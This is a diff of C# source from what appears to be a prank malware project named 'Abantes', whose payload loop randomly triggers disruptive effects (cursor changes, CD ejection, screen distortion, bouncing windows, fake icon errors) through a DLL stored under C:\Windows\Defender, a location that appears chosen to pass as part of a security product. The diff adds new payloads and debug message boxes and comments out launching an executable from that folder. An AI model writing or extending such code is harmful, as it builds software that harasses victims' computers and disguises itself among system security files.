@@ -36,7 +36,8 @@ namespace Abantes.Payloads
                     case 2:
                         if (_random.Next(100) > 50)
                         {
-                            //BSOD
+                            Anoying.CursorIcon(96, 96);
+                            MessageBox.Show("Cursor Payload");
                         }
                         else
                         {
@@ -44,8 +45,10 @@ namespace Abantes.Payloads
                         }
                         break;
                     case 3:
-                        string extractPath = @"C:\Windows\Defender";
-                        Others.StartProcess(extractPath + "\\CursorFollow.exe", "");
+                        //string extractPath = @"C:\Windows\Defender";
+                        //Others.StartProcess(extractPath + "\\CursorFollow.exe", "");
+                        Anoying.CursorIcon(96, 96);
+                        MessageBox.Show("Cursor Payload");
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
@@ -63,6 +66,7 @@ namespace Abantes.Payloads
                         break;
                     case 6:
                         Anoying.EjectCd();
+                        MessageBox.Show("CD Payload");
                         break;
                     case 7:
                         Anoying.Screen_Screw();
@@ -72,6 +76,10 @@ namespace Abantes.Payloads
                         break;
                     case 9:
                         Anoying.Display_Icons_Error();
+                        break;
+                    case 10:
+                        Anoying.CrazyBounce();
+                        MessageBox.Show("Bounce Payload");
                         break;
                 }
                 Thread.Sleep(8000);
@@ -107,6 +115,10 @@ namespace Abantes.Payloads
         public static extern void EjectCd();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
         public static extern void Display_Icons_Error();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CursorIcon@Payloads@1@QAEXXZ")]
+        public static extern void CursorIcon(float dpiX, float dpiY);
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
+        public static extern void CrazyBounce();
         static Point Position;
         static Random _random = new Random();
         public static void MouseTrap()
